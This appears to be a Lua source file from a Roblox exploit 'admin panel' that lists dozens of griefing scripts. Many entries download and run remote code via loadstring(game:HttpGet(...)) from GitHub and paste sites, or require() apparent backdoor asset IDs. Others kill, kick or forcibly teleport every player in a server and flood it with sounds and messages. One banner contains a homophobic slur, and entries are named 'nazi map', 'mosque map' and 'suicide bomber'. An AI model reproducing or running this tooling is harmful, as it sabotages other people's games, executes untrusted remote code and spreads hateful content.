    task.wait()
end

local sky = Instance.new("Sky")
sky.SkyboxBk = "rbxassetid://158118263"
sky.SkyboxDn = "rbxassetid://158118263"
sky.SkyboxFt = "rbxassetid://158118263"
sky.SkyboxLf = "rbxassetid://158118263"
sky.SkyboxRt = "rbxassetid://158118263"
sky.SkyboxUp = "rbxassetid://158118263"

sky.Parent = lighting
]], "CS / SS")

cscript("john doe", [[
	require(2845929020).ooga("%replace%with%username%")
]], "RQ")

cscript("john doe", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/x2-x21-x18-x14-x5-x18/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/john%20doe.lua"))()
]], "LS")

cscript("saveinstance()", [[
	local Params = {
		RepoURL = "https://raw.githubusercontent.com/luau/SynSaveInstance/main/",
		SSI = "saveinstance",
	}
	local synsaveinstance = loadstring(game:HttpGet(Params.RepoURL .. Params.SSI .. ".luau", true), Params.SSI)()
	local Options = {}
	synsaveinstance(Options)
]], "LS")

cscript("lua hammer", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Lua%20Hammer.txt", true))()
]], "LS")

cscript("patchma hub", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/x2-x21-x18-x14-x5-x18/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/patchma%20hub.lua"))()
]], "LS")

cscript("flip tools", [[
	local player = game.Players.LocalPlayer
	local UserInputService = game:GetService("UserInputService")

	local function performfrontflip(character)
		local humanoid = character:WaitForChild("Humanoid")
		local rootPart = character:WaitForChild("HumanoidRootPart")

		humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
		humanoid.Sit = true

		local lookVector = rootPart.CFrame.LookVector
		local spinDirection = Vector3.new(-lookVector.Z, 0, lookVector.X)
		local torso = character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso")
		if torso then
			local bodyVelocity = Instance.new("BodyAngularVelocity", torso)
			bodyVelocity.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
			bodyVelocity.AngularVelocity = spinDirection * -10
			bodyVelocity.P = 1000

			wait(0.4)
			bodyVelocity:Destroy()
		end

		wait(0.2)
		humanoid.Sit = false
	end

	local function performbackflip(character)
		local humanoid = character:WaitForChild("Humanoid")
		local rootPart = character:WaitForChild("HumanoidRootPart")

		humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
		humanoid.Sit = true

		local lookVector = rootPart.CFrame.LookVector
		local spinDirection = Vector3.new(-lookVector.Z, 0, lookVector.X)

		local torso = character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso")
		if torso then
			local bodyVelocity = Instance.new("BodyAngularVelocity", torso)
			bodyVelocity.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
			bodyVelocity.AngularVelocity = spinDirection * 10
			bodyVelocity.P = 1000

			wait(0.4)
			bodyVelocity:Destroy()
		end

		wait(0.2)
		humanoid.Sit = false
	end

	local function onToolActivated(tool)
		local character = player.Character
		if character then
			if tool.Name == "frontflip" then
				performfrontflip(character)
			elseif tool.Name == "backflip" then
				performbackflip(character)
			end
		end
	end

	local function connectToolEvents(tool)
		if tool:IsA("Tool") then
			tool.RequiresHandle = false
			tool.Activated:Connect(function()
				onToolActivated(tool)
			end)
		end
	end

	local function giveTools()
		local backpack = player:FindFirstChild("Backpack")
		if not backpack then return end

		if not backpack:FindFirstChild("FrontFlipTool") then
			local frontFlipTool = Instance.new("Tool")
			frontFlipTool.Name = "frontflip"
			frontFlipTool.RequiresHandle = false
			frontFlipTool.Parent = backpack
			connectToolEvents(frontFlipTool)
		end

		if not backpack:FindFirstChild("BackFlipTool") then
			local backFlipTool = Instance.new("Tool")
			backFlipTool.Name = "backflip"
			backFlipTool.RequiresHandle = false
			backFlipTool.Parent = backpack
			connectToolEvents(backFlipTool)
		end
	end

	local function initializeCharacter(character)
		character:WaitForChild("Humanoid")
		character:WaitForChild("HumanoidRootPart")

		giveTools()

		local backpack = player:WaitForChild("Backpack")
		for _, tool in pairs(backpack:GetChildren()) do
			connectToolEvents(tool)
		end

		backpack.ChildAdded:Connect(function(tool)
			connectToolEvents(tool)
		end)
	end

	player.CharacterAdded:Connect(function(character)
		initializeCharacter(character)
	end)

	if player.Character then
		initializeCharacter(player.Character)
	end

	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
]], "CS / SS")

cscript("fedora admin", [[
	loadstring(game:HttpGet('https://raw.githubusercontent.com/alexx1212/fedoratoomutch/main/toomucth'))()
]], "LS")

cscript("LALOL backdoor scanner", [[
	loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()
]], "LS")

cscript("f3x btools", [[
	loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
]], "LS")

cscript("overseer blade", [[
loadstring(game:HttpGet('https://raw.githubusercontent.com/x2-x21-x18-x14-x5-x18/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/overseer%20blade.lua'))()
]], "LS")

cscript("glitch sounds", [[	
	local duration = 999999
	if game:GetService("SoundService").RespectFilteringEnabled then return end

	local sounds = {}

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("Sound")  then
			table.insert(sounds,v)
		end
	end

	local con = game.DescendantAdded:Connect(function(v)
		if v:IsA("Sound") then
			table.insert(sounds,v)
		end
	end)
	wait(.1)
	local start = math.floor(tick())
	repeat
		for i,v in pairs(sounds) do
			v:Play()
			v.TimePosition = math.random(0,v.TimeLength * 1000)/1000
			task.wait()
		end
	until math.floor(tick()) == start + duration
	con:Disconnect()

	for i,v in pairs(sounds) do
		v:Stop()
	end
]], "CS / SS")

cscript("script hub", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/ScriptHub"))()
]], "LS")

cscript("dank engine", [[
	require(8544809895).G("%replace%with%username%")
]], "RQ")

cscript("dank engine", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/x2-x21-x18-x14-x5-x18/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/dank%20engine.lua"))()
]], "LS")

cscript("OPFinality", [[
	loadstring(game:HttpGet('https://rawscripts.net/raw/OpFinality_590'))()
]], "LS")

cscript("hydroxide", [[
local owner = "Upbolt"
local branch = "revision"

local function webImport(file)
    return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
end

webImport("init")
webImport("ui/main")
]], "LS")

cscript("spiderbot", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/x2-x21-x18-x14-x5-x18/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/spiderbot.lua"))()
]], "LS")

cscript("dual ultima", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/x2-x21-x18-x14-x5-x18/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/dual%20ultima.lua"))()
]], "LS")

cscript("r6", [[
   require(10869521285).ConvertRig(game:GetService("Players").%replace%with%username%,Enum.HumanoidRigType.R6)
]], "RQ")

cscript("r15", [[
    require(10869521285).ConvertRig(game:GetService("Players").%replace%with%username%,Enum.HumanoidRigType.R15)
]], "RQ")

cscript("skidded ultima", [[
	require(76283695815175).unable("%replace%with%username%")
]], "RQ")

cscript("skidded ultima", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/x2-x21-x18-x14-x5-x18/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/skidded%20ultima.lua"))()
]], "LS")

cscript("respawn character", [[
	game:GetService("Players"):FindFirstChild("%replace%with%username%"):LoadCharacter()
]], "CS / SS")

cscript("infinite yield alt", [[
	require(14035238433)("%replace%with%username%")
]], "RQ")

cscript("flamethrower", [[
	require(4666114735).load("%replace%with%username%")
]], "RQ")

cscript("team fat gui", [[
	require(14940596979).fat('%replace%with%username%')
]], "RQ")

cscript("insert spawn", [[
	local bro = Instance.new("SpawnLocation",workspace)
	bro.Anchored = true
]], "CS / SS")

cscript("kill all", [[
	for i,v in pairs(game:GetService("Players"):GetChildren()) do 
		if v:IsA("Player") then
			v.Character:BreakJoints()
		end
	end
]], "CS / SS")

cscript("kick all", [[
	for i,v in pairs(game:GetService("Players"):GetChildren()) do 
		if v:IsA("Player") then
			v:Kick(">:3c")
		end
	end
]], "CS / SS")

cscript("anti ban", [[
	require(2788315378).load(nil,%replace%with%username%)
]], "RQ")

cscript("char all BSoDed", [[
	for i,v in pairs(game.Players:GetPlayers()) do
		v.CharacterAppearanceId = "7512887467"
		v:LoadCharacter()
	end
]], "CS / SS")

cscript("666", [[
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local function isPlayerPart(part)
	local ancestor = part:FindFirstAncestorOfClass("Model")
	return ancestor and Players:GetPlayerFromCharacter(ancestor) ~= nil
end

local function decoratePart(part)
	if part:FindFirstChild("stuf") then return end

	local bbg = Instance.new('BillboardGui')
	bbg.Name = 'stuf'
	bbg.Adornee = part
	bbg.Size = UDim2.new(2.5, 0, 2.5, 0)
	bbg.StudsOffset = Vector3.new(0, 2, 0)
	bbg.MaxDistance = math.huge
	bbg.AlwaysOnTop = true
	bbg.Parent = part

	local tlb = Instance.new('TextLabel')
	tlb.Text = '666 666 666 666 666 666'
	tlb.Font = 'SourceSansBold'
	tlb.FontSize = 'Size48'
	tlb.TextColor3 = Color3.new(1, 0, 0)
	tlb.Size = UDim2.new(1.25, 0, 1.25, 0)
	tlb.Position = UDim2.new(-0.125, -22, -1.1, 0)
	tlb.BackgroundTransparency = 1
	tlb.Parent = bbg

	part.BrickColor = BrickColor.new('Really black')
	part.TopSurface = Enum.SurfaceType.Smooth
	part.BottomSurface = Enum.SurfaceType.Smooth

	local sel = Instance.new('SelectionBox')
	sel.Adornee = part
	sel.Color = BrickColor.new('Really red')
	sel.Parent = part

	local light = Instance.new('PointLight')
	light.Color = Color3.new(1, 0, 0)
	light.Range = 15
	light.Brightness = 5
	light.Parent = part

	local fire = Instance.new('Fire')
	fire.Size = 19
	fire.Heat = 22
	fire.Parent = part
end

-- Apply to all parts instantly
for _, obj in ipairs(workspace:GetDescendants()) do
	if obj:IsA("BasePart") and not isPlayerPart(obj) then
		pcall(decoratePart, obj)
	end
end
]], "CS / SS")

cscript("444", [[
local Players = game:GetService("Players")

local function isPlayerPart(part)
	local ancestor = part:FindFirstAncestorOfClass("Model")
	return ancestor and Players:GetPlayerFromCharacter(ancestor) ~= nil
end

local function decoratePart(part)
	if part:FindFirstChild("stuf") then return end

	local bbg = Instance.new('BillboardGui')
	bbg.Name = 'stuf'
	bbg.Adornee = part
	bbg.Size = UDim2.new(2.5, 0, 2.5, 0)
	bbg.StudsOffset = Vector3.new(0, 2, 0)
	bbg.MaxDistance = math.huge
	bbg.AlwaysOnTop = true
	bbg.Parent = part

	local tlb = Instance.new('TextLabel')
	tlb.Text = '444 444 444 444 444 444'
	tlb.Font = Enum.Font.SourceSansBold
	tlb.TextSize = 48
	tlb.TextColor3 = Color3.fromHex("4051ED")
	tlb.Size = UDim2.new(1.25, 0, 1.25, 0)
	tlb.Position = UDim2.new(-0.125, -22, -1.1, 0)
	tlb.BackgroundTransparency = 1
	tlb.Parent = bbg

	part.BrickColor = BrickColor.new('Really black')
	part.TopSurface = Enum.SurfaceType.Smooth
	part.BottomSurface = Enum.SurfaceType.Smooth

	local sel = Instance.new('SelectionBox')
	sel.Adornee = part
	sel.Color3 = Color3.fromHex("4051ED")
	sel.Parent = part

	local light = Instance.new('PointLight')
	light.Color = Color3.fromHex("4051ED")
	light.Range = 15
	light.Brightness = 5
	light.Parent = part

	local fire = Instance.new('Fire')
	fire.Size = 19
	fire.Heat = 22
	fire.Color = Color3.fromHex("4051ED")
	fire.SecondaryColor = Color3.fromHex("99a3ff")
	fire.Parent = part
end

-- Apply to all parts instantly
for _, obj in ipairs(workspace:GetDescendants()) do
	if obj:IsA("BasePart") and not isPlayerPart(obj) then
		pcall(decoratePart, obj)
	end
end
]], "CS / SS")

cscript("skeleton sky", [[
	imageOne="http://www.roblox.com/asset/?id=169585459"imageTwo="http://www.roblox.com/asset/?id=169585475"imageThree="http://www.roblox.com/asset/?id=169585485"imageFour="http://www.roblox.com/asset/?id=169585502"imageFive="http://www.roblox.com/asset/?id=169585515"imageSix="http://www.roblox.com/asset/?id=169585502"imageSeven="http://www.roblox.com/asset/?id=169585485"imageEight="http://www.roblox.com/asset/?id=169585475"Spooky=Instance.new("Sound",workspace)Spooky.Name="Spooky"Spooky.SoundId="rbxassetid://174270407"Spooky.Volume=15 Spooky.Looped=true Spooky:Play()Sky=Instance.new("Sky",game.Lighting)Sky.SkyboxBk=imageOne Sky.SkyboxDn=imageOne Sky.SkyboxFt=imageOne Sky.SkyboxLf=imageOne Sky.SkyboxRt=imageOne Sky.SkyboxUp=imageOne while true do Sky.SkyboxBk=imageOne Sky.SkyboxDn=imageOne Sky.SkyboxFt=imageOne Sky.SkyboxLf=imageOne Sky.SkyboxRt=imageOne Sky.SkyboxUp=imageOne wait(0.15)Sky.SkyboxBk=imageTwo Sky.SkyboxDn=imageTwo Sky.SkyboxFt=imageTwo Sky.SkyboxLf=imageTwo Sky.SkyboxRt=imageTwo Sky.SkyboxUp=imageTwo wait(0.15)Sky.SkyboxBk=imageThree Sky.SkyboxDn=imageThree Sky.SkyboxFt=imageThree Sky.SkyboxLf=imageThree Sky.SkyboxRt=imageThree Sky.SkyboxUp=imageThree wait(0.15)Sky.SkyboxBk=imageFour Sky.SkyboxDn=imageFour Sky.SkyboxFt=imageFour Sky.SkyboxLf=imageFour Sky.SkyboxRt=imageFour Sky.SkyboxUp=imageFour wait(0.15)Sky.SkyboxBk=imageFive Sky.SkyboxDn=imageFive Sky.SkyboxFt=imageFive Sky.SkyboxLf=imageFive Sky.SkyboxRt=imageFive Sky.SkyboxUp=imageFive wait(0.15)Sky.SkyboxBk=imageSix Sky.SkyboxDn=imageSix Sky.SkyboxFt=imageSix Sky.SkyboxLf=imageSix Sky.SkyboxRt=imageSix Sky.SkyboxUp=imageSix wait(0.15)Sky.SkyboxBk=imageSeven Sky.SkyboxDn=imageSeven Sky.SkyboxFt=imageSeven Sky.SkyboxLf=imageSeven Sky.SkyboxRt=imageSeven Sky.SkyboxUp=imageSeven wait(0.15)Sky.SkyboxBk=imageEight Sky.SkyboxDn=imageEight Sky.SkyboxFt=imageEight Sky.SkyboxLf=imageEight Sky.SkyboxRt=imageEight Sky.SkyboxUp=imageEight wait(0.15)end
]], "CS / SS")

cscript("char all c00lunable", [[
	for i,v in pairs(game.Players:GetPlayers()) do
		v.CharacterAppearanceId = "7618879506"
		v:LoadCharacter()
	end
]], "CS / SS")

cscript("char all unable", [[
	for i,v in pairs(game.Players:GetPlayers()) do
		v.CharacterAppearanceId = "3087640584"
		v:LoadCharacter()
	end
]], "CS / SS")

cscript("char all noxious", [[
		for i,v in pairs(game.Players:GetPlayers()) do
		v.CharacterAppearanceId = "7277426403"
		v:LoadCharacter()
	end
]], "CS / SS")

cscript("char all c00lkidd", [[
	for i,v in pairs(game.Players:GetPlayers()) do
		v.CharacterAppearanceId = "8101069571"
		v:LoadCharacter()
	end
]], "CS / SS")

cscript("send all to the gate", [[
	local TeleportService = game:GetService("TeleportService")
	local Players = game:GetService("Players")

	for _, player in ipairs(Players:GetPlayers()) do
 	   if player and player:IsA("Player") then
  	        TeleportService:Teleport(109758127685691, player)
  	     end
	end
]], "CS / SS")

cscript("creepy lighting", [[
	local l = Instance.new("ColorCorrectionEffect",game.Lighting)
	l.Contrast,l.Saturation,l.Brightness = 2, -0.75, 0.375
	l.TintColor = Color3.new(1,0,0)
]], "CS / SS")

cscript("grab knife v3", [[
	require(2829943043):Run(game:GetService("Players").%replace%with%username%.Name,'i baked you a pie')
]], "RQ")

cscript("message", [[
local function write(text, object)
	if object:IsA("Message") == true then
		local count = object:FindFirstChild("Count")
		if count == nil then
			count = Instance.new("NumberValue")
			count.Parent = object
			count.Name = "Count"
			count.Value = count.Value + 1
		else
			count.Value = count.Value + 1
		end
		local startcount = count.Value
		for i = 1, #text do
			if count.Value == startcount then
				local letter = string.sub(text, i, i)
				object.Text = string.sub(text, 1, i)
				wait(0)
			else
				break
			end
		end

		wait(1)
		if count.Value == startcount then
			for i = #text, 1, -1 do
				if count.Value == startcount then
					object.Text = string.sub(text, 1, i - 1)
					wait(0)
				else
					break
				end
			end
			if count.Value == startcount then
				object:Destroy()
			end
		end
	end
end
local bro = Instance.new("Message",workspace)
bro.Name = "dontdeleteme"
write("WE ARE SO BACK. | gg/bwdk8vAy8n", bro)
]], "CS / SS")

cscript("create baseplate", [[
	baseplate = Instance.new("Part")
	baseplate.Name = "Baseplate"
	baseplate.Size = Vector3.new(2048, 16, 2048)
	baseplate.Anchored = true
	baseplate.Position = Vector3.new(0, 0, 0)
	baseplate.BrickColor = BrickColor.new("Dark grey metallic")
	baseplate.Material = Enum.Material.Plastic
	baseplate.Parent = workspace
		
	txt = Instance.new("Texture")
	txt.Texture = "rbxassetid://6372755229"
	txt.Parent = baseplate
]], "CS / SS")

cscript("polaria", [[
	require(123255432303221):Pload("%replace%with%username%")
]], "RQ")

cscript("polaria", [[
	loadstring(game:HttpGet("https://pastefy.app/agqEB2qs/raw",true))()
]], "LS")

cscript("nazi map", [[
	require(139666139485072).load("%replace%with%username%")
]], "RQ")

cscript("suicide pistol", [[
	require(3023538289).load("%replace%with%username%")
]], "RQ")

cscript("tornado", [[
	require(16178147710).load("%replace%with%username%")
]], "RQ")

cscript("helicopter", [[
	require(9230060018).RAroblox("%replace%with%username%")
]], "RQ")

cscript("infinite yield bytecode", [[
	require(13716575182)("%replace%with%username%")
]], "RQ")

cscript("suicide bomber v2", [[
	require(0x49731b7f).load("%replace%with%username%")
]], "RQ")

cscript("mosque map", [[
	require(131945008071397).map("%replace%with%username%")
]], "RQ")

cscript("steve", [[
local player = game:GetService("Players"):FindFirstChild("%replace%with%username%")
if player then
    local character = player.Character or player:WaitForChild("Character")
    
    for _, v in pairs(character:GetChildren()) do
        if v:IsA("Accessory") then
            v:Destroy()
        end
    end
end
require(15581949972).mc("%replace%with%username%")
]], "RQ")

cscript("spawn noobs", [[
	require(5193737424)("%replace%with%username%", false)
]], "RQ")

cscript("NDS", [[
	require(14704225060).nds("%replace%with%username%")
]], "RQ")

cscript("doge army", [[
	require(5115249013).fehack("%replace%with%username%")
]], "RQ")

cscript("c4", [[
	require(0x1767bf813)("%replace%with%username%")
]], "RQ")

cscript("alif gunman", [[
	require(96378053590566).gunman("%replace%with%username%")
]], "RQ")

cscript("retester ST", [[
	require(136379675730375).verybig("%replace%with%username%")
]], "RQ")

cscript("T0PK3K V5.3", [[
	require(0x342D5F0DA)("%replace%with%username%")
]], "RQ")

cscript("T0PK3K V3", [[
	require(2609384717).load("%replace%with%username%")
]], "RQ")

cscript("uzi", [[
	require(4746064028).load("%replace%with%username%")
]], "RQ")

cscript("excavator", [[
	require(16999802471)("%replace%with%username%")
]], "RQ")

cscript("patrick's wraith", [[
	require(12102103065).Patrick("%replace%with%username%")
]], "RQ")

cscript("insulting message", [[
    local hint = Instance.new("Hint")
    hint.Text = "stop using c00lgui and / or other bullshit guis and focus more on not making / executing scripts that plaster your faggy avatar all over the map, you literal zygotes. "
    hint.Parent = workspace
    hint.Name = "dontdeleteme"

    local message = "stop using c00lgui and / or other bullshit guis and focus more on not making / executing scripts that plaster your faggy avatar all over the map, you literal zygotes. "
    local scrollIndex = 1

    while true do
        local shiftedMessage = message:sub(scrollIndex) .. message:sub(1, scrollIndex - 1)
        hint.Text = shiftedMessage
        wait(0.1)
        scrollIndex = scrollIndex + 1
        if scrollIndex > #message then
            scrollIndex = 1
        end
    end
]], "CS / SS")

cscript("KFC map", [[
	require(3615713971).load()
]], "RQ")

cscript("stummy guns", [[
	require(14671740203)("%replace%with%username%", "Guns")
]], "RQ")

cscript("bow v2", [[
	require(4560072580).load("%replace%with%username%")
]], "RQ")

cscript("server admin", [[
	require(4665394711).load("%replace%with%username%")
]], "RQ")

cscript("server admin", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/x2-x21-x18-x14-x5-x18/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/server%20admin.lua"))()
]], "LS")

cscript("chara", [[
	require(5845670816).load("%replace%with%username%")
]], "RQ")

cscript("soul reaper", [[
	require(7972086233).CLoad("%replace%with%username%")
]], "RQ")

cscript("sledge hammer", [[
	require(8038037940).CLoad("%replace%with%username%")
]], "RQ")

cscript("chrona", [[
	require(4661847142).load("%replace%with%username%")
]], "RQ")

cscript("neptunian V", [[
	require(4661705712).load("%replace%with%username%")
]], "RQ")

cscript("sadist", [[
	require(4665990665).load("%replace%with%username%")
]], "RQ")

cscript("bangang", [[
	require(4659214877).Lunar("%replace%with%username%")
]], "RQ")

cscript("xester", [[
	require(2918747265).load("%replace%with%username%")
]], "RQ")

cscript("cyclone message", [[
    local hint = Instance.new("Hint")
    hint.Text = "I'VE BEEN WAITING FOR THE SAVE... "
    hint.Name = "dontdeleteme"
    hint.Parent = workspace

    local message = "I'VE BEEN WAITING FOR THE SAVE... "
    local scrollIndex = 1

    while true do
        local shiftedMessage = message:sub(scrollIndex) .. message:sub(1, scrollIndex - 1)
        hint.Text = shiftedMessage
        wait(0.1)
        scrollIndex = scrollIndex + 1
        if scrollIndex > #message then
            scrollIndex = 1
        end
    end
]], "CS / SS")

cscript("SSP", [[
	require(16920033857)("%replace%with%username%")
]], "RQ")

cscript("trash hub", [[
	require(17182254638)("%replace%with%username%")
]], "RQ")

cscript("stratosphere", [[
	require(6535776034).load("%replace%with%username%")
]], "RQ")

cscript("sheldoni", [[
	require(15629007042)("%replace%with%username%")
]], "RQ")

cscript("blast ss", [[
	require(5596373023).load(plr.Name)
]], "RQ")

cscript("mouse.avi map", [[
	require(9974938026).map()
]], "RQ")

cscript("shake baseplate", [[
		local myBaseplate = game.Workspace.Baseplate 

	while true do
		myBaseplate.Orientation = Vector3.new(0.1,0,0.1)
		wait()
		myBaseplate.Orientation = Vector3.new(0.3,0,0.3)
		wait()
		myBaseplate.Orientation = Vector3.new(0.5,0,0.5)
		wait()
		myBaseplate.Orientation = Vector3.new(0.7,0,0.7)
		wait()
		myBaseplate.Orientation = Vector3.new(0.9,0,0.9)
		wait()
		myBaseplate.Orientation = Vector3.new(1.1,0,1.1)
		wait()
		myBaseplate.Orientation = Vector3.new(1.3,0,1.3)
		wait()
		myBaseplate.Orientation = Vector3.new(1.5,0,1.5)
		wait()
		myBaseplate.Orientation = Vector3.new(1.7,0,1.7)
		wait()
		myBaseplate.Orientation = Vector3.new(1.9,0,1.9)
		wait()
		myBaseplate.Orientation = Vector3.new(2.1,0,2.1)
		wait()
		myBaseplate.Orientation = Vector3.new(2.3,0,2.3)
		wait()
		myBaseplate.Orientation = Vector3.new(2.5,0,2.5)
		wait()
		myBaseplate.Orientation = Vector3.new(2.7,0,2.7)
		wait()
		myBaseplate.Orientation = Vector3.new(2.9,0,2.9)
		wait()
		myBaseplate.Orientation = Vector3.new(3.1,0,3.1)
		wait()
		myBaseplate.Orientation = Vector3.new(3.3,0,3.3)
		wait()
		myBaseplate.Orientation = Vector3.new(3.5,0,3.5)
		wait()
		myBaseplate.Orientation = Vector3.new(3,7,0,3.7)
		wait()
		myBaseplate.Orientation = Vector3.new(3.9,0,3.9)
		wait()
		myBaseplate.Orientation = Vector3.new(4.1,0,4.1)
		wait()
		myBaseplate.Orientation = Vector3.new(4.3,0,4.3)
		wait()
		myBaseplate.Orientation = Vector3.new(4.5,0,4.5)
		wait()
		myBaseplate.Orientation = Vector3.new(4.7,0,4.7)
		wait()
		myBaseplate.Orientation = Vector3.new(4.9,0,4.9)
		wait()
		myBaseplate.Orientation = Vector3.new(4.7,0,4.7)
		wait()
		myBaseplate.Orientation = Vector3.new(4.5,0,4.5)
		wait()
		myBaseplate.Orientation = Vector3.new(4.3,0,4.3)
		wait()
		myBaseplate.Orientation = Vector3.new(4.1,0,4.1)
		wait()
		myBaseplate.Orientation = Vector3.new(3.9,0,3.9)
		wait()
		myBaseplate.Orientation = Vector3.new(3.7,0,3.7)
		wait()
		myBaseplate.Orientation = Vector3.new(3.5,0,3.5)
		wait()
		myBaseplate.Orientation = Vector3.new(3.3,0,3.3)
		wait()
		myBaseplate.Orientation = Vector3.new(3.1,0,3.1)
		wait()
		myBaseplate.Orientation = Vector3.new(2.9,0,2.9)
		wait()
		myBaseplate.Orientation = Vector3.new(2.7,0,2.7)
		wait()
		myBaseplate.Orientation = Vector3.new(2.5,0,2.5)
		wait()
		myBaseplate.Orientation = Vector3.new(2.3,0,2.3)
		wait()
		myBaseplate.Orientation = Vector3.new(2.1,0,2.1)
		wait()
		myBaseplate.Orientation = Vector3.new(1.9,0,1.9)
		wait()
		myBaseplate.Orientation = Vector3.new(1.7,0,1.7)
		wait()
		myBaseplate.Orientation = Vector3.new(1.5,0,1.5)
		wait()
		myBaseplate.Orientation = Vector3.new(1.3,0,1.3)
		wait()
		myBaseplate.Orientation = Vector3.new(1.1,0,1.1)
		wait()
		myBaseplate.Orientation = Vector3.new(0.9,0,0.9)
		wait()
		myBaseplate.Orientation = Vector3.new(0.7,0,0.7)
		wait()
		myBaseplate.Orientation = Vector3.new(0.5,0,0.5)
		wait()
		myBaseplate.Orientation = Vector3.new(0.3,0,0.3)
		wait()
		myBaseplate.Orientation = Vector3.new(0.1,0,0.1)
		wait()
	end
]], "CS / SS")

cscript("blurple lighting", [[
    local l = Instance.new("ColorCorrectionEffect",game.Lighting)
	l.Contrast,l.Saturation,l.Brightness = 2, -0.75, 0.375
	l.TintColor = Color3.fromHex("4051ED")
]], "CS / SS")

cscript("nullioner", [[
	require(7972181516).CLoad("%replace%with%username%")
]], "RQ")

cscript("crawl", [[
	require(7972019185).CLoad("%replace%with%username%")
]], "RQ")

cscript("the sun is a deadly laser", [[
	require(4528360948):Fire("%replace%with%username%", "hack")
]], "RQ")

cscript("delinquent", [[
	require(1525600089).goldentec("%replace%with%username%")
]], "RQ")

cscript("the alchemist", [[
	require(6224178099).load("%replace%with%username%")
]], "RQ")

cscript("killing machine", [[
	require(6375409514).load("%replace%with%username%")
]], "RQ")

cscript("hololive fubiki", [[
	require(5907637844).load("%replace%with%username%")
]], "RQ")

cscript("dimensiona", [[
	require(4957540270).load("%replace%with%username%")
]], "RQ")

cscript("fiery switcher", [[
	require(5748722400).eliza("%replace%with%username%")
]], "RQ")

cscript("split head", [[
	require(5760009753).load("%replace%with%username%")
]], "RQ")

cscript("killbot", [[
	require(6688474792).load("%replace%with%username%")
]], "RQ")

cscript("fight mode", [[
	require(6438401832).load("%replace%with%username%")
]], "RQ")

cscript("lunatic", [[
	require(5813708464).load("%replace%with%username%")
]], "RQ")

cscript("burn", [[
	require(6478479994).load("%replace%with%username%")
]], "RQ")

cscript("pink barbie car", [[
	require(4745872847).load("%replace%with%username%")
]], "RQ")

cscript("star platinum", [[
	require(5534238329)("%replace%with%username%", "StarPlatinum")
]], "RQ")

cscript("archangel", [[
	require(2972034986):Fire("%replace%with%username%", "test")
]], "RQ")

cscript("blind reaper", [[
	require(4665382251).load("%replace%with%username%")
]], "RQ")

cscript("felipe ascension", [[
	require(5339034667):Start("%replace%with%username%", "AAA")
]], "RQ")

cscript("big glock thing", [[
	require(2959952198):Fire("%replace%with%username%", "test")
]], "RQ")

cscript("chainsaw", [[
	require(4560014954).load("%replace%with%username%")
]], "RQ")

cscript("john wick", [[
	require(4721853215):Fire("%replace%with%username%")
]], "RQ")

cscript("wpxne tools", [[
	require(9971661842):wpnxe("%replace%with%username%")
]], "RQ")

cscript("clear sounds", [[
	for _, sound in pairs(game:GetDescendants()) do
		if sound:IsA("Sound") and sound.Name ~= "dontdeleteme" and sound.Name ~= "canttouchthis" then
			sound:Destroy()
		end
	end
]], "CS / SS")

cscript("clear labeled sounds", [[
	for _, sound in pairs(game:GetDescendants()) do
		if sound:IsA("Sound") and sound.Name == "dontdeleteme" then
			sound:Destroy()
		end
	end
]], "CS / SS")

cscript("clear unlabeled sounds", [[
	for _, sound in pairs(game:GetDescendants()) do
		if sound:IsA("Sound") and sound.Name ~= "dontdeleteme" and sound.Name ~= "canttouchthis" then
			sound:Destroy()
		end
	end
]], "CS / SS")

cscript("self destruct", [[
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local debounce = false

local function createExplosion(position)
	local outerSphere = Instance.new("Part")
	outerSphere.Shape = Enum.PartType.Ball
	outerSphere.Size = Vector3.new(1, 1, 1)
	outerSphere.Anchored = true
	outerSphere.CanCollide = false
	outerSphere.Material = Enum.Material.Neon
	outerSphere.Color = Color3.fromHex("4051ED")
	outerSphere.Transparency = 0.2
	outerSphere.CFrame = CFrame.new(position)
	outerSphere.Name = "ExplosionSphere"
	outerSphere.Parent = workspace

	local innerSphere = Instance.new("Part")
	innerSphere.Shape = Enum.PartType.Ball
	innerSphere.Size = Vector3.new(0.85, 0.85, 0.85)
	innerSphere.Anchored = true
	innerSphere.CanCollide = false
	innerSphere.Material = Enum.Material.Neon
	innerSphere.Color = Color3.new(1, 1, 1)
	innerSphere.Transparency = 0.6
	innerSphere.CFrame = CFrame.new(position)
	innerSphere.Parent = outerSphere

	local touchedParts = {}

	local function affectObject(hit)
		if touchedParts[hit] then return end
		touchedParts[hit] = true

		local model = hit:FindFirstAncestorOfClass("Model")
		local hum = model and model:FindFirstChildWhichIsA("Humanoid")

		if hum and hum.Health > 0 and model ~= player.Character then
			hum.Health = 0
		end
